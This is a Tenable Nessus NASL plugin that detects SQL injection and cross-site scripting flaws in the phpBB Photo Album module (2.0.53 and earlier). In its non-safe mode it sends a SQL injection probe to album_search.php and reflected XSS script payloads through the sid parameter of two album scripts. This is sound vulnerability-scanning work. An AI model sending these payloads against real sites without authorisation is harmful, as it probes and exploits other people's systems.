#
# (C) Tenable Network Security
#


if (description) {
  script_id(18051);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-1114", "CVE-2005-1115");
  script_bugtraq_id(13157, 13158);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"15931");
    script_xref(name:"OSVDB", value:"15932");
    script_xref(name:"OSVDB", value:"15933");
  }

  name["english"] = "phpBB Photo Album Module <= 2.0.53 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The installed version of phpBB on the remote host includes a photo
album module that is prone to multiple vulnerabilities:

  - A SQL Injection Vulnerability
    An attacker can pass arbitrary SQL code through the 'mode'
    parameter of the 'album_search.php' script to manipulate
    database queries.

  - Various Cross-Site Scripting Vulnerabilities
    The application fails to properly sanitize user-input 
    through the 'sid' parameter of the 'album_cat.php' and
    'album_comment.php' scripts. An attacker can exploit
    these flaws to cause arbitrary HTML and script code to
    be run in a user's browser within the context of the
    affected web site.

See also : 

http://archives.neohapsis.com/archives/bugtraq/2005-04/0190.html

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 5
(AV:R/AC:L/Au:NR/C:P/A:N/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in phpBB Photo Album Module <= 2.0.53";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("phpbb_detect.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # If safe checks are enabled...
  if (safe_checks()) {
    # Get the main page.
    req = http_get(item:string(dir, "/album.php"), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # And check the version number embedded in the page.
    if (egrep(
      string:res, 
      # version 2.0.53 and below may be vulnerable.
      # sample version strings:
      #   >Powered by Photo Album Addon 2 &copy; 2002-2003 <a href="http://smartor.is-root.com"
      #   >Powered by Photo Album Addon 2.0.5 &copy; 2002-2003 <a href="http://smartor.is-root.com"
      #   >Powered by Photo Album 2.0.51 &copy; 2002-2003 <a href="http://smartor.is-root.com"
      #   >Powered by Photo Album 2.0.53 &copy; 2002-2003 <a href="http://smartor.is-root.com"
      pattern:'>Powered by Photo Album (Addon )?([01].*|2|2\\.0\\.([0-4].*|5[0-3]?)) &copy; .+ <a href="http://smartor\\.is-root\\.com"', 
      icase:TRUE)
    ) {
      security_warning(port);
    }
  }
  # Otherwise...
  else {
    # Try the SQL injection first.
    req = http_get(
      item:string(
        dir, "/album_search.php?",
        "search=", SCRIPT_NAME, "&",
        # nb: this should just generate a syntax error. If you change this,
        #     also make sure to change the pattern below.
        "mode='NESSUS"
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see a syntax error.
    if (egrep(string:res, pattern:"SQL Error : .+ LIKE '%NESSUS")) {
      security_warning(port);
      exit(0);
    }

    # If that failed to pick up anything, try to exploit the XSS flaws.
    if (get_kb_item("www/"+port+"/generic_xss")) exit(0);

    # A simple alert to display "Nessus was here".
    xss = "<script>alert('Nessus was here');</script>";
    # nb: the url-encoded version is what we need to pass in.
    exss = "%3Cscript%3Ealert('Nessus%20was%20here')%3B%3C%2Fscript%3E";
    exploits = make_list(
      "/album_cat.php?cat_id=1&sid='%22%3E" + exss,
      "/album_comment.php?pic_id=1&sid='%22%3E" + exss
    );

    foreach exploit (exploits) {
      req = http_get(item:string(dir, exploit), port:port);
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # There's a problem if we see our XSS.
      if (xss >< res) {
        security_warning(port);
        exit(0);
      }
    }
  }
}
